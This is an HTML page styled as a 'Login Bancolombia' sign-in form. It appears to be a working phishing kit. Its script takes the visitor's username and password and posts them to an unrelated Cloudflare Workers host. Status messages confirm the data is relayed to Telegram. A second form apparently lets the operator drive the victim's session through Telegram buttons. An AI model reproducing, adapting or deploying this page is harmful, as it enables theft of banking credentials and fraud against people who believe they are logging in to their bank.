<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Bancolombia</title>
</head>
<body>
<h2>Login</h2>
<input type="text" id="usuario" placeholder="Usuario">
<input type="password" id="clave" placeholder="Clave">
<button id="login-btn">Enviar</button>

<h3>Ingresar código para desbloquear botones</h3>
<input type="text" id="codigo" placeholder="Código">
<button id="submit-code">Enviar Código</button>

<div id="status"></div>

<script>
const baseURL = "https://blue-night-7897.claropromoxlaro.workers.dev";
let transactionId = null;

function setStatus(msg) {
  document.getElementById('status').innerText = msg;
}

// LOGIN
document.getElementById('login-btn').addEventListener('click', async () => {
  const usuario = document.getElementById('usuario').value;
  const clave = document.getElementById('clave').value;
  if (!usuario || !clave) return setStatus("Completa usuario y clave");

  transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
  localStorage.setItem('transactionId', transactionId);

  const res = await fetch(`${baseURL}/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usuario, clave, transactionId })
  });

  if (res.ok) setStatus("Datos enviados a Telegram ✅");
  else setStatus("Error al enviar datos");
});

// RESET para desbloquear botones en Telegram
document.getElementById('submit-code').addEventListener('click', async () => {
  const codigo = document.getElementById('codigo').value;
  if (!codigo) return setStatus("Ingresa un código");

  const res = await fetch(`${baseURL}/reset`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: transactionId })
  });

  if (res.ok) setStatus("Botones desbloqueados en Telegram ✅");
  else setStatus("Error al desbloquear botones");
});
</script>
</body>
</html>
